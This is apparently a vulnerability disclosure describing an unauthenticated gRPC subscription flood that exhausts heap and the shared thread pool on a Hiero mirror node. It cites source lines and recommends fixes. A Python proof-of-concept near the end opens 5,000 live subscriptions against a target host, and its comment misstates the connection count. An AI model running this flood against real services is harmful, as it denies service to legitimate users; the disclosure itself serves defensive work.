### Title
Unauthenticated Live-Subscription Flood Exhausts Per-Subscriber Buffers and Shared Thread Pool (DoS)

### Summary
Any unauthenticated external caller can open an unbounded number of persistent live gRPC subscriptions against `ConsensusController.subscribeTopic()` by setting `consensusStartTime` to the current time, bypassing the historical-retrieval phase entirely. Each subscription independently allocates a 16,384-slot backpressure buffer and claims a slot in the shared `boundedElastic` thread pool. Because the only per-connection guard (`maxConcurrentCallsPerConnection = 5`) is scoped to a single TCP connection and there is no global subscription cap or per-IP connection limit, an attacker opening many connections can exhaust JVM heap and the shared scheduler, denying service to all legitimate subscribers.

### Finding Description

**Entry point** — `ConsensusController.subscribeTopic()` (lines 43–53): no authentication, no rate limiting, no IP-based admission control. Any caller reaching the gRPC port can invoke it. [1](#0-0) 

**Immediate live-phase entry** — `TopicMessageFilter.isValidStartTime()` (line 49) only requires `startTime <= DomainUtils.now()`. Sending `consensusStartTime = now` satisfies this constraint, so `PollingTopicMessageRetriever.retrieve()` returns an empty flux (no historical messages), and `TopicMessageServiceImpl.subscribeTopic()` immediately chains into `incomingMessages()` → `topicListener.listen()`, creating a persistent live subscription. [2](#0-1) [3](#0-2) 

**Per-subscriber resource allocation** — `SharedTopicListener.listen()` (lines 21–26) wraps the shared flux with two per-subscriber operators for every caller:
- `onBackpressureBuffer(maxBufferSize, ERROR)` — allocates a bounded queue of up to **16,384 slots** per subscriber (default `maxBufferSize`).
- `publishOn(Schedulers.boundedElastic(), false, prefetch)` — schedules delivery on the JVM-wide `boundedElastic` pool (default cap: 10 × CPU cores threads). [4](#0-3) [5](#0-4) 

**Insufficient guard** — `GrpcConfiguration` sets `maxConcurrentCallsPerConnection = 5` (default). This limits concurrent streams **per TCP connection only**; an attacker opens N connections and gets N × 5 live subscriptions. There is no global connection cap, no per-IP limit, and no `maxInboundConnections` configured on the Netty server builder. [6](#0-5) [7](#0-6) 

**`subscriberCount` is metric-only** — `TopicMessageServiceImpl` tracks `subscriberCount` as a Micrometer gauge but never enforces a ceiling on it. [8](#0-7) 

### Impact Explanation

With thousands of live subscriptions active simultaneously:

1. **Heap exhaustion** — each subscriber's `onBackpressureBuffer(16384)` queue is allocated on the heap. At even modest message rates, 5,000 subscribers × 16,384 slots × ~200 bytes per `TopicMessage` reference ≈ several GB of live heap pressure, triggering GC storms or `OutOfMemoryError`.
2. **Thread pool saturation** — `Schedulers.boundedElastic()` is shared across the entire Spring application. Saturating it with subscriber dispatch tasks starves all other reactive pipelines (importer callbacks, health checks, etc.).
3. **Redis connection amplification** — `RedisTopicListener` creates one shared Redis subscription per topic channel, but each subscriber still adds its own buffer and scheduler slot. A flood across many distinct topic IDs creates proportionally more Redis subscriptions.

Severity: **Critical** — complete service unavailability for all legitimate gRPC consumers.

### Likelihood Explanation

- **No privileges required**: the gRPC port is publicly reachable by design (mirror node public API).
- **Trivial tooling**: a standard gRPC client (e.g., `grpcurl`, any HCS SDK) can open streaming calls in a loop.
- **Low bandwidth cost**: each subscription sends a tiny protobuf request; the attacker pays almost nothing while the server pays per-subscriber memory and CPU.
- **Repeatable**: connections can be re-established after disconnection; the attacker can sustain the flood indefinitely.

### Recommendation

1. **Global subscription cap**: enforce a hard ceiling on `subscriberCount` in `TopicMessageServiceImpl.subscribeTopic()` and return `RESOURCE_EXHAUSTED` when exceeded.
2. **Per-IP connection limit**: configure `NettyServerBuilder.maxConnectionsPerIp()` (or an equivalent L4/L7 proxy rule) to bound connections from a single source.
3. **Mandatory `endTime` or subscription TTL**: require callers to supply an `endTime`, or impose a server-side maximum subscription lifetime, so live subscriptions cannot persist indefinitely.
4. **Reduce default `maxBufferSize`**: 16,384 is very large; a smaller default (e.g., 256–1,024) reduces per-subscriber heap cost.
5. **Authentication/authorization**: gate `subscribeTopic` behind at minimum an API key or mTLS to raise the cost of abuse.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools hedera-sdk or raw proto stubs
import grpc, threading, time
from hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2, timestamp_pb2
import datetime

TARGET = "mirror.mainnet.example.com:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1234  # any valid topic

def open_subscription():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    now = datetime.datetime.utcnow()
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(shardNum=TOPIC_SHARD,
                                        realmNum=TOPIC_REALM,
                                        topicNum=TOPIC_NUM),
        consensusStartTime=timestamp_pb2.Timestamp(
            seconds=int(now.timestamp()),  # current time → skip historical phase
            nanos=0)
    )
    # Block on the streaming call; each thread holds one live subscription
    for _ in stub.subscribeTopic(query):
        pass

# Open 1000 connections × 5 streams each = 5000 live subscriptions
threads = []
for _ in range(5000):
    t = threading.Thread(target=open_subscription, daemon=True)
    t.start()
    threads.append(t)

time.sleep(300)  # hold subscriptions open; monitor server heap / thread pool
```

**Expected result**: server heap climbs proportionally to subscriber count; `boundedElastic` thread pool saturates; legitimate subscribers receive `UNAVAILABLE` or timeout errors.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-53)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L48-51)
```java
    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L63-65)
```java
        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java (L21-26)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        return getSharedListener(filter)
                .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
                .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
                .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L21-34)
```java
    @Min(8192)
    @Max(65536)
    private int maxBufferSize = 16384;

    @Min(32)
    private int maxPageSize = 5000;

    @DurationMin(millis = 50)
    @NotNull
    private Duration interval = Duration.ofMillis(500L);

    @Min(4)
    @Max(256)
    private int prefetch = 48;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```
